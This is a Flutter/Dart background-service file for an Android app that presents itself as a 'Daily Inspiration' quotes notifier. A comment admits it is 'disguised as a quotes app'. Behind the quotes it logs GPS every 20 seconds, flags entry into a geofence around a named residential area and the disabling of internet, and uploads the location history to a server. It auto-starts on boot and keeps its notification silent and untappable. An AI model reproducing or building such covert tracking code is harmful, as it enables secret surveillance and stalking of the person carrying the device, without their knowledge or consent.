import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geolocator/geolocator.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'api_service.dart';

const notificationChannelId = 'locus_quotes';
const notificationId = 888;
const queueKey = 'offline_location_queue';
const serviceRestartKey = 'service_should_be_running';
const alertQueueKey = 'offline_alert_queue';

// Geofence Configuration - Cosmos Greens Bhiwadi
const double _geofenceLat = 28.1944713;
const double _geofenceLng = 76.817266;
const double _geofenceRadiusKm = 10.0; // 10 kilometers

// Track alert states to avoid spamming
const String _lastGeofenceAlertKey = 'last_geofence_alert';
const String _lastConnectivityAlertKey = 'last_connectivity_alert';
const int _alertCooldownMs = 5 * 60 * 1000; // 5 minutes cooldown between same alerts

// Queue size limits to prevent memory issues on low-end devices
const int _maxQueueSize = 500; // Max locations to queue offline
const int _maxAlertQueueSize = 50; // Max alerts to queue offline

// Inspirational quotes to display in the notification
const List<String> _quotes = [
  "The only way to do great work is to love what you do.",
  "Innovation distinguishes between a leader and a follower.",
  "Stay hungry, stay foolish.",
  "Life is what happens when you're busy making other plans.",
  "The future belongs to those who believe in the beauty of their dreams.",
  "In the middle of difficulty lies opportunity.",
  "Success is not final, failure is not fatal.",
  "Be yourself; everyone else is already taken.",
  "The best time to plant a tree was 20 years ago. The second best time is now.",
  "Do what you can, with what you have, where you are.",
  "It does not matter how slowly you go as long as you do not stop.",
  "Everything you've ever wanted is on the other side of fear.",
  "Believe you can and you're halfway there.",
  "The only impossible journey is the one you never begin.",
  "What lies behind us and what lies before us are tiny matters.",
  "Happiness is not something ready made. It comes from your own actions.",
  "Turn your wounds into wisdom.",
  "The mind is everything. What you think you become.",
  "An unexamined life is not worth living.",
  "We become what we think about.",
];

String _getRandomQuote() {
  return _quotes[Random().nextInt(_quotes.length)];
}

/// Calculate distance between two points using Haversine formula
double _calculateDistanceKm(double lat1, double lon1, double lat2, double lon2) {
  const double earthRadiusKm = 6371.0;
  
  final double dLat = _degreesToRadians(lat2 - lat1);
  final double dLon = _degreesToRadians(lon2 - lon1);
  
  final double a = sin(dLat / 2) * sin(dLat / 2) +
      cos(_degreesToRadians(lat1)) * cos(_degreesToRadians(lat2)) *
      sin(dLon / 2) * sin(dLon / 2);
  
  final double c = 2 * atan2(sqrt(a), sqrt(1 - a));
  
  return earthRadiusKm * c;
}

double _degreesToRadians(double degrees) {
  return degrees * pi / 180;
}

/// Check if position is within the geofence
bool _isWithinGeofence(double lat, double lng) {
  final distance = _calculateDistanceKm(lat, lng, _geofenceLat, _geofenceLng);
  return distance <= _geofenceRadiusKm;
}

/// Check internet connectivity
Future<bool> _hasInternetConnection() async {
  final connectivityResult = await Connectivity().checkConnectivity();
  return connectivityResult.isNotEmpty && 
         !connectivityResult.contains(ConnectivityResult.none);
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    notificationChannelId,
    'Daily Inspiration',
    description: 'Inspirational quotes to brighten your day.',
    importance: Importance.min, // Minimum importance - no sound, no popup
    showBadge: false,
    enableVibration: false,
    playSound: false,
  );

  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
      FlutterLocalNotificationsPlugin();

  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);

  // Initialize notifications without launch intent
  await flutterLocalNotificationsPlugin.initialize(
    const InitializationSettings(
      android: AndroidInitializationSettings('@mipmap/ic_launcher'),
    ),
    // Do NOT set onDidReceiveNotificationResponse - this prevents app opening on tap
  );

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: false,
      isForegroundMode: true,
      notificationChannelId: notificationChannelId,
      initialNotificationTitle: '✨ Daily Inspiration',
      initialNotificationContent: _getRandomQuote(),
      foregroundServiceNotificationId: notificationId,
      autoStartOnBoot: true, // Auto restart on boot
    ),
    iosConfiguration: IosConfiguration(
      autoStart: false,
      onForeground: onStart,
      onBackground: onIosBackground,
    ),
  );
}

@pragma('vm:entry-point')
Future<bool> onIosBackground(ServiceInstance service) async {
  WidgetsFlutterBinding.ensureInitialized();
  DartPluginRegistrant.ensureInitialized();
  return true;
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  final apiService = ApiService();

  service.on('stopService').listen((event) {
    service.stopSelf();
  });

  // Show an inspirational quote in the notification (disguised as a quotes app)
  if (service is AndroidServiceInstance) {
    service.setForegroundNotificationInfo(
      title: "✨ Daily Inspiration",
      content: _getRandomQuote(),
    );
    
    // Mark service as running for restart capability
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool(serviceRestartKey, true);
  }

  // Change quote periodically (every 5 minutes)
  Timer.periodic(const Duration(minutes: 5), (timer) async {
    if (service is AndroidServiceInstance) {
      service.setForegroundNotificationInfo(
        title: "✨ Daily Inspiration",
        content: _getRandomQuote(),
      );
    }
  });

  Timer.periodic(const Duration(seconds: 20), (timer) async {
    SharedPreferences? prefs;
    try {
      prefs = await SharedPreferences.getInstance();
    } catch (e) {
      print('Error getting SharedPreferences: $e');
      return; // Skip this cycle, try again next time
    }
    
    final sessionId = prefs.getString('current_session_id');
    final endTimeMillis = prefs.getInt('session_end_time');

    if (sessionId != null && endTimeMillis != null) {
      if (DateTime.now().millisecondsSinceEpoch < endTimeMillis) {
        try {
          // Check internet connectivity with timeout
          bool hasInternet = false;
          try {
            hasInternet = await _hasInternetConnection().timeout(
              const Duration(seconds: 5),
              onTimeout: () => false,
            );
          } catch (e) {
            hasInternet = false;
          }
          
          final lastConnectivityAlert = prefs.getInt(_lastConnectivityAlertKey) ?? 0;
          final now = DateTime.now().millisecondsSinceEpoch;
          
          if (!hasInternet && (now - lastConnectivityAlert > _alertCooldownMs)) {
            // Internet is off - queue alert
            print('⚠️ Internet connectivity lost!');
            await prefs.setInt(_lastConnectivityAlertKey, now);
            
            final alert = {
              'sessionId': sessionId,
              'type': 'CONNECTIVITY_LOST',
              'message': 'Internet connection has been disabled on the device',
              'timestamp': now,
            };
            
            List<String> alertQueue = prefs.getStringList(alertQueueKey) ?? [];
            // Limit alert queue size to prevent memory issues
            if (alertQueue.length < _maxAlertQueueSize) {
              alertQueue.add(jsonEncode(alert));
              await prefs.setStringList(alertQueueKey, alertQueue);
            }
          }

          // Get location with timeout - use balanced accuracy for battery life on Redmi 9A
          late Position position;
          try {
            position = await Geolocator.getCurrentPosition(
              desiredAccuracy: LocationAccuracy.high,
              timeLimit: const Duration(seconds: 15),
            );
          } catch (e) {
            print('Error getting location: $e');
            // Try with lower accuracy as fallback
            try {
              position = await Geolocator.getCurrentPosition(
                desiredAccuracy: LocationAccuracy.medium,
                timeLimit: const Duration(seconds: 10),
              );
            } catch (e2) {
              print('Fallback location also failed: $e2');
              return; // Skip this cycle
            }
          }
          
          // Check geofence
          final isInGeofence = _isWithinGeofence(position.latitude, position.longitude);
          final lastGeofenceAlert = prefs.getInt(_lastGeofenceAlertKey) ?? 0;
          
          if (isInGeofence && (now - lastGeofenceAlert > _alertCooldownMs)) {
            // User is within restricted zone
            print('⚠️ User entered geofence zone!');
            await prefs.setInt(_lastGeofenceAlertKey, now);
            
            final distance = _calculateDistanceKm(
              position.latitude, position.longitude, 
              _geofenceLat, _geofenceLng
            );
            
            final alert = {
              'sessionId': sessionId,
              'type': 'GEOFENCE_ENTERED',
              'message': 'Device entered restricted zone (${distance.toStringAsFixed(2)} km from center)',
              'latitude': position.latitude,
              'longitude': position.longitude,
              'timestamp': now,
            };
            
            List<String> alertQueue = prefs.getStringList(alertQueueKey) ?? [];
            if (alertQueue.length < _maxAlertQueueSize) {
              alertQueue.add(jsonEncode(alert));
              await prefs.setStringList(alertQueueKey, alertQueue);
            }
          }
          
          final newLocation = {
            'sessionId': sessionId,
            'latitude': position.latitude,
            'longitude': position.longitude,
            'timestamp': DateTime.now().millisecondsSinceEpoch,
          };

          // Add to queue with size limit
          List<String> queue = prefs.getStringList(queueKey) ?? [];
          if (queue.length < _maxQueueSize) {
            queue.add(jsonEncode(newLocation));
            await prefs.setStringList(queueKey, queue);
          } else {
            // Remove oldest entries to make room
            queue = queue.sublist(queue.length - _maxQueueSize + 1);
            queue.add(jsonEncode(newLocation));
            await prefs.setStringList(queueKey, queue);
            print('Queue full, removed oldest entries');
          }

          // Try to flush queues if we have internet
          if (hasInternet) {
            // Send alerts first
            List<String> alertQueue = prefs.getStringList(alertQueueKey) ?? [];
            if (alertQueue.isNotEmpty) {
              print('Attempting to send ${alertQueue.length} alerts...');
              bool allAlertsSent = true;
              
              for (final alertJson in alertQueue) {
                try {
                  final alert = jsonDecode(alertJson) as Map<String, dynamic>;
                  final success = await apiService.sendAlert(
                    alert['sessionId'],
                    alert['type'],
                    alert['message'],
                    lat: alert['latitude']?.toDouble(),
                    lng: alert['longitude']?.toDouble(),
                  );
                  if (!success) {
                    allAlertsSent = false;
                    break;
                  }
                } catch (e) {
                  print('Error sending alert: $e');
                  allAlertsSent = false;
                  break;
                }
              }
              
              if (allAlertsSent) {
                print('Successfully sent all alerts.');
                await prefs.setStringList(alertQueueKey, []);
              }
            }
            
            // Send locations in smaller batches to prevent timeout
            queue = prefs.getStringList(queueKey) ?? [];
            if (queue.isNotEmpty) {
              // Send max 50 locations per batch to avoid timeout
              const int batchSize = 50;
              final int toSend = queue.length > batchSize ? batchSize : queue.length;
              final List<String> batchStrings = queue.sublist(0, toSend);
              
              final List<Map<String, dynamic>> batch = batchStrings
                  .map((e) => jsonDecode(e) as Map<String, dynamic>)
                  .toList();

              print('Attempting to send ${batch.length} of ${queue.length} locations...');
              
              try {
                final success = await apiService.sendLocations(batch);

                if (success) {
                  print('Successfully sent batch.');
                  // Remove sent items from queue
                  queue = queue.sublist(toSend);
                  await prefs.setStringList(queueKey, queue);
                } else {
                  print('Failed to send. Keeping in queue.');
                }
              } catch (e) {
                print('Error sending locations: $e');
              }
            }
          } else {
            print('No internet. Data queued (${queue.length} locations).');
          }

        } catch (e, stackTrace) {
          print('Error in tracking loop: $e');
          print('Stack trace: $stackTrace');
        }
      } else {
        // Session expired
        print('Session expired. Stopping service.');
        await prefs.remove('current_session_id');
        await prefs.remove('session_end_time');
        await prefs.setBool(serviceRestartKey, false);
        service.stopSelf();
      }
    } else {
       // No active session, stop service
       await prefs.setBool(serviceRestartKey, false);
       service.stopSelf();
    }
  });
}

// Helper to check if service should restart
Future<bool> shouldServiceRestart() async {
  final prefs = await SharedPreferences.getInstance();
  return prefs.getBool(serviceRestartKey) ?? false;
}

// Helper to request battery optimization exemption
Future<void> requestBatteryOptimizationExemption() async {
  // This is handled in the main app via permission_handler or similar
}
